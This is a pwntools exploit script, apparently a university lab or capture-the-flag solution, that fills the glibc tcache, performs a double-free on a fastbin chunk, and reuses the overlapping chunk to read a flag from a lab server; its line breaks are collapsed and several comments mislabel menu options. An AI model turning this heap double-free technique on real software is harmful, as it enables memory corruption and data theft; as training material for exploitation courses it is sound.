''' Script Module Importing '''from pwn import *import string''' Establish Connection '''p = remote("csc748.hostbin.org", 7091)      # Test Script Against Server# p = process("./9-1_lab.bin")              # Test Script Locally# p = gdb.debug("./9-1_lab.bin")            # Debug with GDB# Step 1: Allocate Chunksprint("\n[*] Allocating Chunks")#Allocating 'TCache' Chunksfor letter in string.ascii_uppercase[:7]:    p.sendlineafter(b"Choice: ", b'1')           # Select Option (1) New    p.sendlineafter(b"Contents: ", bytes(letter*16, 'utf-8'))  # Fill Chunk with letters A to Fprint("    [-] 'TCache' Chunks Allocated: A-G")# Allocate A and Bp.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'H'p.sendlineafter(b"Contents: ", b'H'*16)      # Fill Chunkp.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'I'p.sendlineafter(b"Contents: ", b'I'*16)      # Fill Chunkprint("    [-] 'Fastbin' Chunks Allocated: H-I")# Step 2: Free Chunksprint("\n[*] Freeing Chunks")for i in range(7):    p.sendlineafter(b"Choice: ", b'3')                 # Select Option (3) Delete    p.sendlineafter(b"ID?: ", bytes(str(i), 'utf-8'))  # Free Chunkprint("    [-] Chunks 'A-G' Freed, TCache Filled")p.sendlineafter(b"Choice: ", b'3')          # Select Option (3) 'Delete' to Free Chunk 'H'p.sendlineafter(b"ID?: ", b'7')  # Free Chunkp.sendlineafter(b"Choice: ", b'3')          # Select Option (3) 'Delete' to Free Chunk 'I'p.sendlineafter(b"ID?: ", b'8')  # Free Chunkprint("    [-] Chunks 'H-I' Freed, Fastbin Contains Overflow")p.sendlineafter(b"Choice: ", b'3')          # Select Option (1) Newp.sendlineafter(b"ID?: ", b'7')  # Free Chunkprint("    [!] Double-Free on Chunk 'H' Successfully Executed")# Step 3: Re-Allocate Chunksprint("\n[*] Re-Allocating Chunks")for letter in string.ascii_uppercase[:7]:    p.sendlineafter(b"Choice: ", b'1')           # Select Option (1) New    p.sendlineafter(b"Contents: ", bytes(letter*16, 'utf-8'))  # Fill Chunk with letters A to Fprint("    [-] Chunks 'A-G' Re-Allocated from TCache")# ReAllocate Ap.sendlineafter(b"Choice: ", b'1')          # Select Option (1) Newp.sendlineafter(b"Contents: ", b'H'*16)      # Fill Chunk# ReAllocate Bp.sendlineafter(b"Choice: ", b'1')          # Select Option (1) Newp.sendlineafter(b"Contents: ", b'I'*32)      # Fill Chunkprint("    [-] Chunks 'H-I' Re-Allocated from Fastbin")# Step 4: Allocate Target Chunkprint("\n[*] Allocating Flag Chunk")print("    [-] Selecting Option (5) 'Load flag into memory' to Overwrite 'H'")p.sendlineafter(b"Choice: ", b'5')          # Select Option (1) Newprint("    [!] Flag Loaded into Chunk 'H' Successfully")# Step 5: Recieve Flagprint("\n[*] Reading Flag Chunk")p.sendlineafter(b"Choice: ", b'2')          # Select Option (1) Newp.sendlineafter(b"ID?: ", b'7')  # Send Chunk IDp.recvuntil(b"Contents: ")      # Discard Program Outputflag = p.recvuntil(b"}").decode('utf-8')    # Extract Flag#p.recvuntil(b'What')                  # Discard Program Outputprint(f"\n[*] Flag Successfully Obtained: {flag}") # Print Flag#p.interactive()                     # Start Interactive Session